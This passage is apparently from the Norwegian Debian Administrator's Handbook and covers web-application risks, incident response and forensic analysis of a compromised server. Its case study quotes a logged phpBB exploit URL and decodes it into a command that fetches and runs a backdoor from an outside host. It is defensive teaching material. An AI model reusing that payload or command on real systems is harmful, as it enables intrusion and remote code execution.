      </section>
      <section>
        <title>Å kompilere filene</title>

	<para>Så snart 3 filene (<filename>example.if</filename>, <filename>example.fc</filename>, og <filename>example.te</filename>) svarer til dine forventninger til de nye reglene, kjør bare <command>make NAME=devel</command> for å generere en modul i  <filename>example.pp</filename>-filen (du kan umiddelbart laste den med  <command>semodule -i example.pp</command>). Hvis flere moduler er definert vil <command>make</command> lage alle de korresponderende <filename>.pp</filename>-filene.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Andre sikkerhetsrelaterte overveielser</title>

    <para>Sikkerhet er ikke bare et teknisk problem; for mer enn noe annet, handler det om god praksis og forståelse av risiko. Denne seksjonen gjennomgår noen av de vanligste risikoene, samt noen "beste praksis"-er som, avhengig av tilfellet, bør øke sikkerheten eller minske virkningen av et vellykket angrep.</para>
    <section>
      <title>Iboende risiko hos nett-applikasjoner</title>

      <para>Nettprogrammenes universelle karakteren førte til spredningen. Flere kjøres ofte i parallell: en nettpost, en wiki, noen gruppevaresystemer, et forum, et fotogalleri, en blogg, og så videre. Mange av disse programmene er avhengige av "LAMP" (<emphasis>Linux, Apache, MySQL, PHP</emphasis>)-stablen. Dessverre er mange av disse programmene også skrevet uten mye hensyn til sikkerhetsproblemer. Data som kommer utenfra brukes også ofte med liten eller ingen validering. Å gi spesiallagede verdier kan brukes til å undergrave et anrop til en kommando, slik at en annen blir utført i stedet. Mange av de mest åpenbare problemene er løst etter hvert som tiden har gått, men nye sikkerhetsproblemer dukker opp med jevne mellomrom.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> SQL injeksjon</title>

	<para>Når et program legger inn data i SQL-spørringer på en usikker måte, blir det sårbart for SQL-injeksjoner; dette navnet dekker at det lov å endre et parameter slik at den faktiske spørringen som utføres av programmet er forskjellig fra den tiltenkte, enten for å skade database eller for å få tilgang til data som normalt ikke bør være tilgjengelig. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
        <indexterm><primary>SQL injection</primary></indexterm>
      </sidebar>

      <para>Å oppdatere nettprogrammer regelmessig er derfor et must, slik at ikke noe forsøk (enten av en profesjonell angriper eller en script kiddy) kan utnytte en kjent sårbarhet. Den faktiske risikoen avhenger av tilfellet, og spenner fra ødeleggelse av data - til kjøring av vilkårlig kode, medregnet å gjøre nettsider uleselige.</para>
    </section>
    <section>
      <title>Å vite hva som forventes</title>

      <para>En sårbarhet i et nettprogram blir ofte brukt som utgangspunkt for inntrengningsforsøk. Her  følger en kort gjennomgang av mulige konsekvenser.</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> Å filtrere HTTP-spørringer</title>

	<para>Apache 2 inkluderer moduler som tillater filtrering av innkommende HTTP-spørringer. Dette gjør det mulig å blokkere noen angrepsvektorer. For eksempel kan det å begrense lengden på parametrene forhindre overflom i mellomlager. Mer generelt kan man validere parametre selv før de sendes til nettprogrammet, og begrense tilgangen etter mange kriterier. Dette kan også kombineres med dynamiske brannmuroppdateringer, slik at en klient som krenker en av reglene blir utestengt fra tilgang til netttjeneren for en gitt periode.</para>

	<para>Å sette opp disse kontrollene kan være en lang og kronglete oppgave, men det kan lønne seg når nettprogrammet som som skal utplasseres har en tvilsom merittliste når det gjelder sikkerhet.</para>

	<para><emphasis>mod-security2</emphasis> (i <emphasis role="pkg">libapache2-mod-security2</emphasis>-pakken) er den viktigste slike modulen. Den har til og med mange egne "klare til bruk"-regler (i <emphasis role="pkg">modsecurity-crs</emphasis> package) som du enkelt kan aktivere.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>Konsekvensene av en inntrengning vil være synlig i ulik grad avhengig av motivasjonen til angriperen. <emphasis>Script-kiddies</emphasis> gjelder bare oppskrifter de finner på nettsider; oftest, de gjør en nettside uleselig eller de sletter data. I mer subtile tilfeller legger de inn usynlig innhold på nettsidene, slik som å forbedre henvisninger til sine egne sider i søkemotorer.</para>

      <para>En mer avansert angriper vil gå utover det. Et katastrofe-scenario kunne være dette opplegget: Angriperen får muligheten til å utføre kommandoer som <literal>www-data</literal>-bruker, men kjører en kommando som krever mange håndteringer. For å gjøre livet sitt enklere, installerer de andre nettprogrammer spesielt utformet for å fjernutføre mange typer kommandoer, som for eksempel surfing i filsystemet, å undersøke tillatelser, å laster opp eller ned filer, utføre kommandoer, og selv gi et nettverkskall. Ofte vil sårbarheten tillate å kjøre en <command>wget</command>-kommando som vil laste ned skadelig programvare til <filename>/tmp/</filename>, og så kjøre den. Den skadelige programvaren er ofte lastet ned fra en utenlandsk nettside som tidligere er kompromittert, for å dekke sporene og gjøre det vanskeligere å finne den faktiske opprinnelsen til angrepet.</para>

      <para>På dette punktet, har angriperen nok bevegelsesfrihet slik at de ofte kan installere en IRC <emphasis>bot</emphasis>(en robot som kobles til en IRC tjener og kan styres av denne kanalen). Denne boten er ofte brukt til å dele ulovlige filer (uautoriserte kopier av filmer eller programvare, og så videre). En besluttsom angriper kan ønske å gå enda lengre. <literal>www-data</literal>-kontoen gir ikke full tilgang til maskinen, og angriperen vil prøve å få administratorrettigheter. Nå, dette skal ikke være mulig, men hvis nettprogrammet ikke var oppdatert, er sjansene at kjernen og andre programmer er utdatert også; dette følger noen ganger av en avgjørelse fra administrator som, til tross for å vite om sikkerhetsproblemet, har unnlatt å oppgradere systemet siden det ikke er noen lokale brukere. Angriperen kan så dra nytte av denne andre sårbarheten for å få rot-tilgang.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Opptrapping av privilegier</title>

	<para>Dette begrepet omfatter alt som kan anvendes for å oppnå ytterligere tillatelser enn en gitt bruker bør normalt ha. <command>sudo</command>.programmet er utviklet nettopp med det formål å gi administrative rettigheter til enkelte brukere. Men det samme begrepet brukes også for å beskrive handlingen når en angriper utnytter en sårbarhet å oppnå utilbørlige rettigheter.</para>
      </sidebar>

      <para>Nå eier angriper maskinen; og de vil vanligvis prøve å holde på dette privilegiet så lenge som mulig. Dette innebærer å installere en <emphasis>rootkit</emphasis>, et program som vil erstatte enkelte komponentene i systemet, slik at angriperen vil kunne få administratorrettigheter igjen på et senere tidspunkt; rootkit forsøker også å skjule sin egen eksistens samt eventuelle spor etter inntrengning. En skadelig <command>ps</command>-program vil unngå å liste noen prosesser, <command>netstat</command>vil ikke liste somn av de aktive forbindelsene, og så videre. Ved hjelp av rotrettigheter, var angriperen i stand til å observere hele systemet, men fant ikke viktige data; slik at de vil prøve å få tilgang til andre maskiner i bedriftens nettverk. Analysere administratorkontoen og historiefiler, finner angriperen hvilke maskiner som rutinemessig er benyttet. Ved å erstatte
<command>sudo</command> eller <command>ssh</command> med en skadelig program, kan angriperen avskjære noen av administratorens passord, som de vil bruke på de oppdagede tjenerne ... og inntrengingen kan forplante seg derfra.</para>

      <para>Dette blir et marerittscenario som kan forebygges ved flere tiltak. De neste avsnittene beskriver noen av disse tiltakene.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Kloke valg av programvare</title>

      <para>Så snart de potensielle sikkerhetsproblemene er kjent, må de tas hensyn til ved hvert trinn i prosessen med å legge ut en tjeneste, særlig når man velger ut programvaren som skal installeres. Mange nettsteder, for eksempel <literal>SecurityFocus.com</literal>, har en liste over nylig oppdagede sårbarheter, som kan gi en ide om sikkerhets-merittene før en spesiell programvare blir utplassert. Selvfølgelig må denne informasjonen balanseres mot populariteten til den nevnte programvaren: Et mer allment brukt programmet er et mer fristende mål, og det vil bli nærmere saumfart som en konsekvens. På den annen side kan et nisjeprogram være fullt av sikkerhetshull som aldri blir publisert på grunn av manglende interesse for en sikkerhetsgjennomgang.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Sikkerhetsgjennomgang</title>

	<para>Sikkerhetsgjennomgang er prosessen med grundig lesing og analyse av kildekoden til noen programvarer, på jakt etter potensielle sikkerhetsproblemer den kan inneholde. Slike revisjoner er vanligvis proaktive og gjennomføres for å sikre et program oppfyller visse krav til sikkerhet.</para>
      </sidebar>

      <para>I verden av fri programvare, er det vanligvis rikelig rom for valg, og velge en programvare fremfor en annen bør være en beslutning basert på kriteriene som gjelder lokalt. Flere funksjoner innebærer en økt risiko for at en sårbarhet gjemmer seg i koden; Å plukke det mest avanserte programmet til en oppgave, kan faktisk virke mot sin hensikt, for en bedre tilnærming er å plukke det enkleste programmet som tilfredsstiller kravene.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Zero-day sårbarhet</title>

	<para>Et <emphasis>zero-day exploit</emphasis>-angrep er vanskelig å hindre; Begrepet gjelder en sårbarhet som ennå ikke er kjent for forfatterne av programmet.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Å håndtere en maskin som en helhet</title>

      <para>De fleste Linux-distribusjoner installerer som standard en rekke Unix tjenester og mange verktøy. I mange tilfelle er disse tjenestene og verktøyene ikke påkrevd for den faktiske formål som administrator setter opp for maskinen. Som en generell retningslinje i sikkerhetssaker, er det best å avinstallere unødvendige programvare. Faktisk, det er ingen vits i å sikre en FTP-tjener, hvis en sårbarhet i en annen, ubrukt tjeneste kan brukes til å få administratorrettigheter på hele maskinen.</para>

      <para>Med samme resonnement, vil brannmurer ofte bli konfigurert til å kun gi tilgang til tjenester som er ment å være offentlig tilgjengelige.</para>

      <para>Nåværende datamaskiner er kraftige nok til å være vertskap for flere tjenester på samme fysiske maskin. Fra et økonomisk synspunkt, er en slik mulighet interessant: bare én datamaskin å administrere, lavere energiforbruk, og så videre. Fra sikkerhetssynspunkt, kan et slikt valg være et problem. En kompromittert tjeneste kan gi tilgang til hele maskinen, som igjen svekker de andre tjenestene som ligger på samme datamaskin. Denne risikoen kan reduseres ved å isolere tjenestene. Dette kan oppnås enten med virtualisering (hver tjeneste legges til en egen virtuell maskin eller beholder), eller med AppArmor/SELinux (at hver tjenestenisse har et tilstrekkelig dimensjonert sett med tillatelser).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Brukere er spillere</title>

      <para>Å diskutere sikkerhet bringer umiddelbart tankene til beskyttelse mot angrep fra anonyme inntrengere som gjemmer seg i Internet-jungelen; Men et ofte glemt faktum er at risikoen også kommer fra innsiden: En ansatt som skal forlate selskapet kunne laste ned sensitive filer om viktige prosjekter og selge dem til konkurrentene, en uaktsom selger kan forlate arbeidsplassen uten å låse sin sesjon under et møte om et nytt prospekt, en klønete bruker kan slette feil katalog ved et uhell, og så videre.</para>

      <para>Responsen for disse risikoene kan omfatte tekniske løsninger: At ikke mer enn de nødvendige tillatelsene skal gis til brukerne, og at regelmessige sikkerhetskopier er et must. For å unngå risikoene, er i mange tilfelle brukeropplæring den hensiktsmessige beskyttelsen.</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para><emphasis role="pkg">autolog</emphasis> pakken har et program som automatisk frakobler inaktive brukere etter en konfigurerbar forsinkelse. Det tillater også å stanse  brukerprosesser som vedvarer etter at en økt er avsluttet, og dermed hindrer brukere fra å kjøre nisser.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Fysisk sikkerhet</title>

      <para>Det er ingen vits i å sikre tjenester og nettverk hvis datamaskinene selv ikke er beskyttet. Viktige data fortjener å bli lagret på varm-pluggede harddisker i RAID-områder, fordi harddisker mislykkes til slutt og datatilgjengelighet er et must. Men hvis et pizzabud kan gå inn i bygningen, snike seg inn i tjenerrommet og snike seg ut med noen få utvalgte harddisker, er en viktig del av sikkerheten ikke dekket. Hvem kan gå inn i tjenerrommet ? Er tilgangen overvåket? Disse spørsmålene fortjener overveielse (og svar) når den fysiske sikkerheten blir vurdert.</para>

      <para>Fysisk sikkerhet omfatter også risikoen for ulykker som branner. Denne risikoen berettiger lagring av sikkerhetskopier i en egen bygning, eller i det minste i et brannsikkert skap.</para>
    </section>
    <section>
      <title>Juridisk ansvar</title>

      <para>En administrator har, mer eller mindre implisitt, tillit hos sine brukere, samt brukere av nettverket generelt. En bør derfor unngå enhver uaktsomhet som ondsinnede mennesker kan utnytte.</para>

      <para>En angriper som tar  kontroll over maskinen din for så bruke det som en fremskutt base (kjent som et "stafettsystem") for derfra å utføre andre ulovlige aktiviteter. kan føre til juridiske problemer for deg, siden den angrepne i utgangspunktet vil se angrepet komme fra ditt system, og derfor anser deg som angriper (eller som medskyldig). I mange tilfelle kan en angriper bruke din tjener som en mulighet til å sende spam, som ikke bør ha mye innvirkning (unntatt en mulig registrering på svartelister som kan begrense din mulighet til å sende legitime e-poster), men det vil likevel ikke være hyggelig. I andre tilfelle kan større problemer forårsakes fra maskinen, for eksempel tjenestenekt-angrep. Dette vil noen ganger forårsake tap av inntekter, ettersom de legitime tjenestene vil være utilgjengelige, og data kan bli ødelagt; Noen ganger vil dette også innebære en reell kostnad, fordi den angrepne part kan starte søksmål mot deg. Rettighetshavere kan saksøke deg hvis en uautorisert kopi av et verk, beskyttet av opphavsrett deles fra tjeneren din, så vel som at andre selskaper tvinges av servicenivå-avtaler dersom de er forpliktet til å betale erstatning etter angrep fra din maskinen.</para>

      <para>Når slike situasjoner oppstår, er det vanligvis ikke nok å hevde uskyld; I det minste, trenger du overbevisende bevis som viser mistenkelig aktivitet på systemet ditt kommer fra en gitt IP-adresse. Dette vil ikke være mulig hvis du forsømmer anbefalingene i kapittelet her og lar angriperen få tilgang til en privilegert konto (spesielt rot) og bruker den til å dekke sine spor.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Å håndtere en kompromittert maskin</title>

    <para>Til tross for de beste intensjoner og et nøye utformet sikkerhetsopplegg, kan en administrator likevel stå ansikt til ansikt med en kapring. Denne seksjonen inneholder noen veiledninger om hvordan man skal reagere konfrontert med slike uheldige omstendigheter.</para>
    <section>
      <title>Avdekke å se innbruddet</title>

      <para>Det første skrittet for å reagere mot et innbrudd er å bli oppmerksom på en slik handling. Dette er ikke selvinnlysende, spesielt uten et tilstrekkelig infrastruktur for overvåking.</para>

      <para>Innbruddshandlinger oppdages ofte ikke før de har direkte konsekvenser på de legitime tjenestene på vertsmaskinen, for eksempel at tilkoblinger bremses ned, noen brukere ikke klarer å koble til, eller noen annen form for feil. Konfrontert med disse problemene, må administratoren å ta et god titt på maskinen og nøye granske hva den feiler. Dette er vanligvis den tidspunktet da man oppdager en uvanlig prosess, for eksempel en som heter <literal>apache</literal> i stedet for standarden <literal>/usr/sbin/apache2</literal>. Hvis vi følger dette eksemplet, er tingen å gjøre å være oppmerksom på prosess-identifisereren, og sjekk <filename>/proc/<replaceable>pid</replaceable>/exe</filename> for å se hvilket program denne prosessen kjører for øyeblikket:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>KIjører et prfogram installert under <filename>/var/tmp/</filename> som en nettjener? Ingen tvil igjen, maskinen er kompromittert.</para>

      <para>Dette er bare ett eksempel, men mange andre tips kan få det til å ringe i administratorens bjelle:</para>
      <itemizedlist>
        <listitem>
	  <para>et alternativ til en kommando som ikke lenger fungerer; versjonen av programvaren som kommandoen hevder å være, samsvarer ikke med den versjonen som den er ment å være installert i samsvar med  <command>dpkg</command>;</para>
        </listitem>
        <listitem>
	  <para>en ledetekst eller en økt-hilsen som indikerer at den siste forbindelsen kom fra en ukjent tjener på et annet kontinent;</para>
        </listitem>
        <listitem>
	  <para>feil forårsake av at <filename>/tmp/</filename>-partisjon er full, noe som viste seg å være med ulovlige kopierte filmer;</para>
        </listitem>
        <listitem>
	  <para>og så videre.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Å sette tjeneren Off-Line</title>

      <para>I alle, bortsett fra de mest eksotiske tilfelle, kommer innbrudd fra nettverket, og angriperen trenger et fungerende nettverk for å nå sine mål (tilgang til konfidensielle data, deling av ulovlige filer, skjuling av sin identitet ved å bruke maskinen som til stafett, og så videre). Å ta datamaskinen av nettverket vil hindre angriperen fra å nå disse målene, hvis denne ikke har klart å gjøre det allerede.</para>

      <para>Dette kan bare være mulig hvis tjeneren er fysisk tilgjengelig. Når tjeneren leier plas hos en vertsleverandør på en annen kant av landet, eller hvis tjeneren ikke er tilgjengelig for noen annen grunn, er det vanligvis en god idé å starte med å samle viktig informasjon (se <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> og <xref linkend="sect.reconstituting-the-attack-scenario" />), deretter å isolere denne tjeneren så mye som mulig ved å lukke så mange tjenester som mulig (vanligvis, alt untatt <command>sshd</command>). Denne saken er fortsatt vanskelig, siden man ikke kan utelukke muligheten for at angriperen har samme SSH-tilgang som administratoren har; Dette gjør det vanskeligere å "rense" maskinene.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Beholde alt som kan brukes som bevis</title>

      <para>Å forstå angrep og/eller vinne søksmål mot angriperne forutsetter å ta kopier av alle viktige elementer; medregnet innholdet på harddisken, en liste over alle prosesser som kjører, og en liste over alle åpne tilkoblinger. Innholdet i RAM kan også benyttes, men det er sjelden brukt i praksis.</para>

      <para>I sakens hete, er administratorer ofte fristet til å utføre mange kontroller av den kompromitterte maskinen; Det er vanligvis ikke en god idé. Hver kommando er potensielt skadelig og kan slette deler av bevis. Kontrollene bør begrenses til minimumssettet, (<command>netstat -tupan</command> for nettverksforbindelser, <command>ps auxf</command> for en liste med prosesser, <command>ls -alR /proc/[0-9]*</command> for litt mer informasjon om programmer som kjører), og hver utført sjekk bør omsorgsfullt skrives ned.</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Varm analyse</title>

	<para>Mens det kan virke fristende å analysere systemet mens det går, spesielt når en ikke er i fysisk kontakt med tjeneren, er dette best at dette unngås: Rett og slett at du ikke kan stole på de programmene som er installert på den kompromitterte systemet. Det er fullt mulig for en skadelig <command>ps</command>-kommando å skjule noen prosesser, eller for en skadelig  <command>ls</command> å skjule filer; noen ganger kan til og med kjernen være kompromittert!</para>

	<para>Dersom en slik varm analyse er fortsatt nødvendig, bør man sørge for å bare bruke godt kjente programmer. En god måte å gjøre det ville være å ha en rednings-CD med uberørte programmer eller en skrivebeskyttet nettverksressurs. Imidlertid kan selv disse mottiltak ikke være nok hvis kjernen selv er kompromittert.</para>
      </sidebar>

      <para>Når de "dynamiske" elementer ha blitt lagret, er neste steg å lagre et komplett bilde av harddisken. Å lage et slikt bilde er umulig hvis filsystemet er fortsatt utvikles, og det er derfor det må monteres om skrivebeskyttet . Den enkleste løsningen er ofte å stoppe tjeneren brutalt (etter å ha kjørt <command>sync</command>) og starte den på nytt med en rednings-CD. Hver partisjon skal kopieres med et verktøy som <command>dd</command>; Disse bildene kan sendes til en annen tjener (muligens med det veldig praktiske <command>nc</command>-verktøyet). En annen mulighet kan være enda enklere: Bare få disken ut av maskinen og erstatt den med en ny en som kan  formateres og reinstalleres.</para>
    </section>
    <section>
      <title>Reinstallering</title>
      <indexterm><primary>backdoor</primary></indexterm>

      <para>Tjeneren skal ikke bringes tilbake i drift uten en fullstendig reinstallasjon. Dersom skaden var alvorlig (hvis administrative rettigheter lakk ut), er det nesten ingen annen måte å være sikker på at vi blir kvitt alt angriperen kan ha etterlatt seg (spesielt <emphasis>backdoors</emphasis>). Selvfølgelig må alle de nyeste sikkerhetsoppdateringene benyttes, slik som å plugge den sårbarheten som brukes av angriperen. Ideelt, å analysere angrepet skal peke på denne angrepsmetoden, slik at man faktisk kan være sikker på å få fikset den. Ellers kan man bare håpe at sårbarheten var en av de som er ordnet via oppdateringene.</para>

      <para>Å installere en ekstern tjener er ikke alltid lett; det kan innebære bistand fra vertselskapet, fordi ikke alle slike selskaper tilbyr automatiserte reinstalleringsystemer. Forsiktighet bør utvises for ikke å reinstallere maskinen fra sikkerhetskopier tatt opp etter kompromitteringen. Ideelt sett bør kun data gjenopprettes, selve programvaren må installeres på nytt fra installasjonsmediet .</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Rettslig analyse</title>

      <para>Nå som tjenesten er gjenopprettet, er det på tide å se nærmere på diskbilder av det kompromitterte systemet for å forstå angrepsmetoden. Ved montering disse bildene, man sørge for å bruke <literal>ro,nodev,noexec,noatime</literal>-alternativene for å unngå å endre innholdet (inkludert tidsstempler for tilgangen til filer) eller å kjøre kompromitterte programmer ved en feiltakelse.</para>

      <para>Å gjennomgå et angrepsscenario innebærer vanligvis å leter etter alt som ble endret og kjørt:</para>
      <itemizedlist>
        <listitem>
	  <para>Å lese <filename>.bash_history</filename>-filer ofte svært interessant;</para>
        </listitem>
        <listitem>
	  <para>det gjør også listing av filer som nylig ble opprettet, endret eller åpnet;</para>
        </listitem>
        <listitem>
	  <para><command>strings</command>-kommandoen kan være til hjelp med å identifisere programmer installert av angriperen, ved å ekstrahere strenger fra binærfiler;</para>
        </listitem>
        <listitem>
	  <para>Loggfilene i <filename>/var/log/</filename> gjør det ofte mulig å rekonstruere hendelsesrekkefølgen;</para>
        </listitem>
        <listitem>
	  <para>verktøy for spesielle formål tillater også gjenoppretting av innholdet i potensielt slettede filer, medregnet loggfiler som angripere ofte sletter.</para>
        </listitem>
      </itemizedlist>

      <para>Noen av disse operasjonene kan gjøres enklere med spesialisert programvare. Spesielt <emphasis role="pkg">sleuthkit</emphasis>-pakken inneholder mange verktøy for å analysere et filsystem. Bruken er gjort enklere med <emphasis>Autopsy Forensic Browser</emphasis>-grafiske grensesnitt (i  <emphasis role="pkg">autopsy</emphasis>-pakken).</para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Å rekonstruere et angrepscenario</title>

      <para>Alle elementene samlet under analysen skal passe sammen som brikker i et puslespill; Etableringen av de første mistenkelige filer, er ofte korrelert med logger som beviser brudd. En virkelig eksempel bør være tydeligere enn lange teoretiske skriblinger.</para>

      <para>Den følgende loggen er et utdrag fra en Apache <filename>access.log</filename>:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>Dette eksemplet samsvarer med en utnyttelse av et gammelt sikkerhetsproblem i phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>Å dekode denne lange URL-en fører til at en forstår at angriperen klarte å kjøre noe PHP-kode, nemlig: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Selvfølgelig, en <filename>bd</filename>-fil ble funnet i  <filename>/tmp/</filename>. Å kjøre <command>strings /mnt/tmp/bd</command> returnerer, blant andre strenger, <literal>PsychoPhobia Backdoor is starting...</literal>. Dette ser virkelig ut som en bakdør.</para>

      <para>En tid senere ble denne tilgangen brukt til å laste ned, installere og kjøre en IRC <emphasis>bot</emphasis> som er koblet til et underjordisk IRC-nettverk. Oppstarten kan da styres via denne protokollen og instrueres til å laste ned filer til deling. Dette programmet har også sin egen loggfil:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
</programlisting>

      <para>Disse sporene viser at to videofiler er lagret på tjeneren ved hjelp av IP-adressen 82.50.72.202.</para>

      <para>Parallelt har angriperen også lastet ned et par ekstra filer,<filename>/tmp/pt</filename> og <filename>/tmp/loginx</filename>. Å kjøre disse filene gjennom <command>strings</command> leder til strenger slike som  <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> og <foreignphrase>Now wait for suid shell...</foreignphrase>. Disse ser ut som programmer som utnytter lokale sårbarheter for å få administrative rettigheter. Hadde de nå sine mål? I dette tilfellet sannsynligvis ikke, ettersom ingen filer synes å ha blitt modifisert etter det første innbruddet.</para>

      <para>I dette eksemplet er hele inntrengningen rekonstruert, og det kan utledes at angriperen har greid å dra nytte av det kompromitterte systemet i rundt tre dager. Men det viktigste elementet i analysen er at sikkerhetsbruddet er identifisert, og administratoren kan være sikker på at den nye installasjonen virkelig fikser sårbarheten.</para>
    </section>
  </section>
</chapter>
